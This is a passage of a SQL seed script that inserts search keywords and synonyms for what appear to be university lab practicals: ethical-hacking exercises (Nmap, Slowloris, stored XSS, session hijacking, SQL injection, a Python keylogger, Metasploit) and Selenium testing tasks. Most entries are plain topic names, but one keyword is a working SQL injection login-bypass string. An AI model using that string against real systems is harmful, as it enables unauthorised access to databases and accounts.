    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$-sf$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$-sn$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$-sx$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$Ethical Hacking Practical 4$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$Nmap Port Scanning Commands$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$SYN FIN NULL XMAS Scan Nmap$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$wireshark$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$dos attack$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$denial of service$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$slowloris$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$nemesy$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$packet capture$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$tcp stream$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$apache2$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$Ethical Hacking Practical 5$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-5$skey$),
    $term$Wireshark Packet Capture and Slowloris DoS Attack$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$xss$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$cross-site scripting$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$persistent xss$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$stored xss$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$dvwa$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$xampp$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$lampp$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$guestbook$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$Ethical Hacking Practical 6$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$Stored XSS Attack DVWA$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-6$skey$),
    $term$Persistent Cross Site Scripting$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$session impersonation$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$session hijacking$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$tamper data$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$cookie editor$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$phpsessid$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$firefox$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$techpanda$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$Ethical Hacking Practical 7$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-7$skey$),
    $term$Session Hijacking with Tamper Data and Cookie Editor$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$sql injection$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$sqli$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$dvwa$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$1' or '1'='1'#$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$1=1$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$database dump$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$xampp$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$Ethical Hacking Practical 8$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$SQL Injection Attack on DVWA$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-8$skey$),
    $term$SQLi Practical$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$keylogger$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$python keylogger$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$pynput$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$pynput.keyboard$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$listener$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$on_press$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$on_release$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$key.txt$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$Ethical Hacking Practical 9$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-9$skey$),
    $term$Keylogger in Python using pynput$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$metasploit$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$msfconsole$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$metasploitable$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$kali linux$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$proftpd$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$vsftpd$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$rhost$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$lhost$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$exploit$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$netdiscover$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$Ethical Hacking Practical 10$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$Metasploit Exploitation Practical$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-10$skey$),
    $term$Exploiting Metasploitable2 with Kali Linux$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$selenium ide$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$test suite$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$4 test cases$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$guru99$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$newtours$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$.side$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$firefox extension$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$stqa practical 1$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-1$skey$),
    $term$Install Selenium IDE and Write 4 Test Cases$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$selenium ide$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$assert title$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$verify title$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$assert text$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$verify text$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$verify element present$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$selenese$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$stqa practical 2$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-2$skey$),
    $term$Selenium IDE Assert vs Verify Commands$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$selenium server$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$selenium rc$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$eclipse setup$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$java build path$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$client-combined-3.141.59.jar$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$geckodriver$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$browserstack$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$STQA Practical 3$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-3$skey$),
    $term$Install Selenium Server and Configure Eclipse Java Project$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$selenium webdriver$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$login automation$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$firefoxdriver$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$identifierid$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$geckodriver$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$accounts.google.com$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$p3$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$STQA Practical 4$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-4$skey$),
    $term$Automate Login Process using Selenium WebDriver$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$excel$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$update 10 student records$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$jxl$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$writableworkbook$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$input.xls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$output.xls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$studentrecord$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$result$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$STQA Practical 5$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-5$skey$),
    $term$Update 10 Student Records in Excel using Java JXL$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$studentscore$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$scored more than 60$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$testng$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$jxl$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$student.xls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$result.xls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$data extraction$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$STQA Practical 6$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-6$skey$),
    $term$Select Students Scoring More Than 60 in Excel$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$total number of objects$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$number of links$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$testlinks$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$findelements$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$by.xpath("//a")$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$object identification$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$stqa practical 7$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-7$skey$),
    $term$Count Total Objects or Links on a Web Page using Selenium$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$combo box$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$list box$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$number of items$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$testcombobox$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$p08$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$select$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$getoptions$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$selenium webdriver$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$STQA Practical 8$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-8$skey$),
    $term$Count Items in a Dropdown or Combo Box using Selenium$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$checkbox$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$checkboxes$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$checked and unchecked$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$testcheckbox$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$isselected$term$,
